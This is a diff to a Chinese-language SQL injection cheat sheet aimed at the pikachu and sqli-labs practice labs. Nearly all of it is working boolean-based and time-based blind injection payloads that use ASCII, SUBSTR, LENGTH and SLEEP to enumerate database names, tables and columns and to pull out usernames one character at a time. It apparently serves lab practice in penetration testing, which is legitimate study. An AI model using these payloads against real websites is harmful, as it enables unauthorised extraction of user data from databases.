+' AND (LENGTH(USER()) = 14) -- # true
+```
+
+> 当长度为 14 时返回为真，说明有 14 个字节;
 >
-> 得到数据库的长度为 8 个字符
+> 可尝试二分法.
 
-判断数据库名
+### 7.2. Database
 
-> 用 `substr` 从数据库中取出第一个字符
-
-```
-http://192.168.1.76/sqli-labs/Less-1/?id=1' and ascii(substr(database(),1,1)) > 100 --+
-```
+判断数据库的个数
 
 ```
-http://192.168.1.76/sqli-labs/Less-1/?id=1' and ascii(substr(database(),1,1)) = 115 --+
+' AND (SELECT COUNT(*) FROM information_schema.SCHEMATA) = 5 -- 
 ```
 
-> 用二分法判断 `ascii` 数值
->
-> 第一个字符的 ascii 码为 115，字符为 s
+判断第一个数据库名的字节长度
 
 ```
-http://192.168.1.76/sqli-labs/Less-1/?id=1' and ascii(substr(database(),2,1)) = 101 --+
+' AND (SELECT LENGTH(schema_name) FROM information_schema.SCHEMATA LIMIT 0, 1) = 18 -- 
 ```
 
-> 第二个字符的 ascii 码为 101，字符为 e
->
-> 最后得到数据库名为 security
-
-`mid` 与 `substr` 效果相同
-
- `left` （从左侧第一个开始取三个字符）
+判断第一个数据库名的第一个字符
 
 ```
-http://192.168.1.76/sqli-labs/Less-1/?id=1' and ascii(left(database(),3)) > 100 --+
+' AND ASCII (SUBSTR((SELECT schema_name FROM information_schema.SCHEMATA LIMIT 0, 1), 1, 1)) = 105 -- 
 ```
 
- `right` （从右侧第一个开始区三个字符）
+判断当前数据库名的字节长度
 
 ```
-http://192.168.1.76/sqli-labs/Less-1/?id=1' and ascii(right(database(),3)) > 100 --+
+' AND (LENGTH(DATABASE()) = 7) -- 
 ```
 
-### 8.2. 爆表
-
-判断数据表的个数
+判断当前数据库名的第一个字符
 
 ```
-http://192.168.1.76/sqli-labs/Less-1/?id=1' and (select count(*) from information_schema.tables where table_schema=database())=4 --+
+' AND ASCII (SUBSTR(DATABASE(), 1, 1)) = 112 -- 
 ```
 
-> 数据表为 4 个
+> 使用 `ASCII()` 将提取到的字符转换为 ASCII 码
 
-当 `information_schema` 被过滤时使用 `sys.schema`
+### 7.2. Tables
 
-> 在 `mysql 5.7` 中新增了 `sys.schema` 基础数据来自于 `performance_chema` 和 `information_schema` 两个库，本身数据库不存储数据
-
-判断第一个数据表的长度
+判断指定数据库中数据表的个数
 
 ```
-?id=1' and （select length(table_name）from information_schema.tables where table_schema=database() LIMIT 0, 1)=1 --+
+' AND (SELECT COUNT(*) FROM information_schema.TABLES WHERE table_schema='pikachu') = 5 -- 
 ```
 
-### 7.3. 爆字段
-
-判断字段的个数
+判断当前数据库中数据表的个数
 
 ```
-http://192.168.1.76/sqli-labs/Less-1/?id=1' and (select count(*) from information_schema.columns where table_schema=database() and table_name='users')=3 --+
+' AND (SELECT COUNT(*) FROM information_schema.TABLES WHERE table_schema=DATABASE()) = 5 -- 
 ```
 
-> 字段为 3 个
+> 当 `information_schema` 被过滤时可使用 `sys.schema` 
 
-当 `information_schema` 被过滤时使用 `sys.schema`
+判断指定数据库中第一个数据表名的字节长度
 
-> 在 `mysql 5.7` 中新增了 `sys.schema` 基础数据来自于 `performance_chema` 和 `information_schema` 两个库，本身数据库不存储数据
+```
+' AND (SELECT LENGTH(table_name) FROM information_schema.TABLES WHERE table_schema='pikachu' LIMIT 0, 1) = 8 -- 
+```
 
-### 7.4. 拖库
+判断当前数据库中第一个数据表名的字节长度
+
+```
+' AND (SELECT LENGTH(table_name) FROM information_schema.TABLES WHERE table_schema=DATABASE() LIMIT 0, 1) = 8 -- 
+```
+
+判断指定数据库中第一个数据表名的第一个字符
+
+```
+' AND ASCII (SUBSTR((SELECT table_name FROM information_schema.TABLES WHERE table_schema='pikachu' LIMIT 0, 1), 1, 1)) = 104 -- 
+```
+
+判断当前数据库中第一个数据表名的第一个字符
+
+```
+' AND ASCII (SUBSTR((SELECT table_name FROM information_schema.TABLES WHERE table_schema=DATABASE() LIMIT 0, 1), 1, 1)) = 104 -- 
+```
+
+### 7.3. Columns
+
+判断指定数据库中指定数据表中字段的个数
+
+```
+' AND (SELECT COUNT(*) FROM information_schema.COLUMNS WHERE table_schema='pikachu' and table_name='users') = 4 -- 
+```
+
+判断当前数据库中指定数据表中字段的个数
+
+```
+' AND (SELECT COUNT(*) FROM information_schema.COLUMNS WHERE table_schema=DATABASE() and table_name='users') = 4 -- 
+```
+
+判断指定数据库中指定数据表中第一个字段名的字节长度
+
+```
+' AND (SELECT LENGTH(column_name) FROM information_schema.COLUMNS WHERE table_schema='pikachu' AND table_name='users' LIMIT 0, 1) = 2 -- 
+```
+
+判断当前数据库中指定数据表中第一个字段名的字节长度
+
+```
+' AND (SELECT LENGTH(column_name) FROM information_schema.COLUMNS WHERE table_schema=DATABASE() AND table_name='users' LIMIT 0, 1) = 2 -- 
+```
+
+判断指定数据库中指定数据表中第一个字段名的第一个字符
+
+```
+' AND ASCII (SUBSTR((SELECT column_name FROM information_schema.COLUMNS WHERE table_schema='pikachu' AND table_name='users' LIMIT 0, 1), 1, 1)) = 105 -- 
+```
+
+判断当前数据库中指定数据表中第一个字段名的第一个字符
+
+```
+' AND ASCII (SUBSTR((SELECT column_name FROM information_schema.COLUMNS WHERE table_schema=DATABASE() AND table_name='users' LIMIT 0, 1), 1, 1)) = 105 -- 
+```
+
+### 7.5. Dump
+
+判断指定数据库中指定数据表中指定字段中数据的个数
+
+```
+' AND (SELECT COUNT(*) FROM pikachu.users) = 3 -- 
+```
+
+判断当前数据库中指定数据表中指定字段中数据的个数
+
+```
+' AND (SELECT COUNT(*) FROM users) = 3 -- 
+```
+
+判断指定数据库中指定数据表中第一个字段中第一个数据的字节长度
+
+```
+' AND (SELECT LENGTH(username) FROM pikachu.users LIMIT 0, 1) = 5 -- 
+```
+
+判断当前数据库中指定数据表中第一个字段中第一个数据的字节长度
+
+```
+' AND (SELECT LENGTH(username) FROM users LIMIT 0, 1) = 5 -- 
+```
+
+判断指定数据库中指定数据表中第一个字段中第一个数据的第一个字符
+
+```
+' AND ASCII (SUBSTR((SELECT username FROM pikachu.users LIMIT 0, 1), 1, 1)) = 97 -- 
+```
+
+判断当前数据库中指定数据表中第一个字段中第一个数据的第一个字符
+
+```
+' AND ASCII (SUBSTR((SELECT username FROM users LIMIT 0, 1), 1, 1)) = 97 -- 
+```
 
 ## 8. Time
 
-当反馈信息没有区别时，可以根据响应时间进行注入
+### 8.1. Probe
 
-> http://192.168.1.76/sqli-labs/Less-8/
-
-### 8.1. 判断是否存在 SQL 注入
-
-尝试传递特殊字符 `` `
+探测时间盲注是否可用
 
 ```
-http://192.168.1.76/sqli-labs/Less-8/?id=1'
+' AND SLEEP(3) -- 
 ```
 
-> 当传递 `'` 时报错，说明符号被注入，存在 SQL 注入
->
-> 但是没有回显
+### 8.2. Database
 
-添加注释使之正常访问
+判断数据库的个数
 
 ```
-http://192.168.1.76/sqli-labs/Less-8/?id=1' --+
+' AND IF((SELECT COUNT(*) FROM information_schema.SCHEMATA) = 5, SLEEP(3), 1) -- 
 ```
 
-### 8.2. 爆库
-
-判断数据库长度
-
-> 通过使用 `length` 计算字段的长度判断真假（一个汉字为 3 个字符，一个数字或字母为 1 个字符）
+判断第一个数据库名的字节长度
 
 ```
-http://192.168.1.76/sqli-labs/Less-1/?id=1' and if(length(database()) > 10,sleep(3),1) --+
+' AND IF((SELECT LENGTH(schema_name) FROM information_schema.SCHEMATA LIMIT 0, 1) = 18, SLEEP(3), 1) -- 
 ```
 
-> 最后得到数据库长度为 8
-
-判断数据库名
+判断第一个数据库名的第一个字符
 
 ```
-http://192.168.1.76/sqli-labs/Less-8/?id=1' and if(ascii(substr(database(),1,1)) = 100,sleep(3),1) --+
+' AND IF(ASCII (SUBSTR((SELECT schema_name FROM information_schema.SCHEMATA LIMIT 0, 1), 1, 1)) = 105, SLEEP(3), 1) -- 
 ```
 
-> 当数据库的第一个字符 ascii 码长度为 100 时，则正常，否则休眠三秒
->
-> 最后得到 ascii 码为 150
+判断当前数据库名的字节长度
+
+```
+' AND IF(LENGTH(DATABASE()) = 7, SLEEP(3), 1) -- 
+```
+
+判断当前数据库名的第一个字符
+
+```
+' AND IF(ASCII(SUBSTR(DATABASE(), 1, 1)) = 112, SLEEP(3), 1) -- 
+```
+
+> 使用 `ASCII()` 将提取到的字符转换为 ASCII 码
+
+### 8.2. Tables
+
+判断指定数据库中数据表的个数
+
+```
+' AND IF((SELECT COUNT(*) FROM information_schema.TABLES WHERE table_schema='pikachu') = 5, SLEEP(3), 1) -- 
+```
+
+判断当前数据库中数据表的个数
+
+```
+' AND IF((SELECT COUNT(*) FROM information_schema.TABLES WHERE table_schema=DATABASE()) = 5, SLEEP(3), 1) -- 
+```
+
+> 当 `information_schema` 被过滤时可使用 `sys.schema` 
+
+判断指定数据库中第一个数据表名的字节长度
+
+```
+' AND IF((SELECT LENGTH(table_name) FROM information_schema.TABLES WHERE table_schema='pikachu' LIMIT 0, 1) = 8, SLEEP(3), 1) -- 
+```
+
+判断当前数据库中第一个数据表名的字节长度
+
+```
+' AND IF((SELECT LENGTH(table_name) FROM information_schema.TABLES WHERE table_schema=DATABASE() LIMIT 0, 1) = 8, SLEEP(3), 1) -- 
+```
+
+判断指定数据库中第一个数据表名的第一个字符
+
+```
+' AND IF(ASCII (SUBSTR((SELECT table_name FROM information_schema.TABLES WHERE table_schema='pikachu' LIMIT 0, 1), 1, 1)) = 104, SLEEP(3), 1) -- 
+```
+
+判断当前数据库中第一个数据表名的第一个字符
+
+```
+' AND IF(ASCII (SUBSTR((SELECT table_name FROM information_schema.TABLES WHERE table_schema=DATABASE() LIMIT 0, 1), 1, 1)) = 104, SLEEP(3), 1) -- 
+```
+
+### 8.3. Columns
+
+判断指定数据库中指定数据表中字段的个数
+
+```
+' AND IF((SELECT COUNT(*) FROM information_schema.COLUMNS WHERE table_schema='pikachu' and table_name='users') = 4, SLEEP(3), 1) -- 
+```
+
+判断当前数据库中指定数据表中字段的个数
+
+```
+' AND IF((SELECT COUNT(*) FROM information_schema.COLUMNS WHERE table_schema=DATABASE() and table_name='users') = 4, SLEEP(3), 1) -- 
+```
+
+判断指定数据库中指定数据表中第一个字段名的字节长度
+
+```
+' AND IF((SELECT LENGTH(column_name) FROM information_schema.COLUMNS WHERE table_schema='pikachu' AND table_name='users' LIMIT 0, 1) = 2, SLEEP(3), 1) -- 
+```
+
+判断当前数据库中指定数据表中第一个字段名的字节长度
+
+```
+' AND IF((SELECT LENGTH(column_name) FROM information_schema.COLUMNS WHERE table_schema=DATABASE() AND table_name='users' LIMIT 0, 1) = 2, SLEEP(3), 1) -- 
+```
+
+判断指定数据库中指定数据表中第一个字段名的第一个字符
+
+```
+' AND  IF(ASCII (SUBSTR((SELECT column_name FROM information_schema.COLUMNS WHERE table_schema='pikachu' AND table_name='users' LIMIT 0, 1), 1, 1)) = 105, SLEEP(3), 1) -- 
+```
+
+判断当前数据库中指定数据表中第一个字段名的第一个字符
+
+```
+' AND  IF(ASCII (SUBSTR((SELECT column_name FROM information_schema.COLUMNS WHERE table_schema=DATABASE() AND table_name='users' LIMIT 0, 1), 1, 1)) = 105, SLEEP(3), 1) -- 
+```
+
+### 8.5. Dump
+
+判断指定数据库中指定数据表中指定字段中数据的个数
+
+```
+' AND IF((SELECT COUNT(*) FROM pikachu.users) = 3, SLEEP(3), 1) -- 
+```
+
+判断当前数据库中指定数据表中指定字段中数据的个数
+
+```
+' AND IF((SELECT COUNT(*) FROM users) = 3, SLEEP(3), 1) -- 
+```
+
+判断指定数据库中指定数据表中第一个字段中第一个数据的字节长度
+
+```
+' AND IF((SELECT LENGTH(username) FROM pikachu.users LIMIT 0, 1) = 5, SLEEP(3), 1) -- 
+```
+
+判断当前数据库中指定数据表中第一个字段中第一个数据的字节长度
+
+```
+' AND IF((SELECT LENGTH(username) FROM users LIMIT 0, 1) = 5, SLEEP(3), 1) -- 
+```
+
+判断指定数据库中指定数据表中第一个字段中第一个数据的第一个字符
+
+```
+' AND IF(ASCII (SUBSTR((SELECT username FROM pikachu.users LIMIT 0, 1), 1, 1)) = 97, SLEEP(3), 1) -- 
+```
+
+判断当前数据库中指定数据表中第一个字段中第一个数据的第一个字符
+
+```
+' AND IF(ASCII (SUBSTR((SELECT username FROM users LIMIT 0, 1), 1, 1)) = 97, SLEEP(3), 1) -- 
+```
 
 ---
 
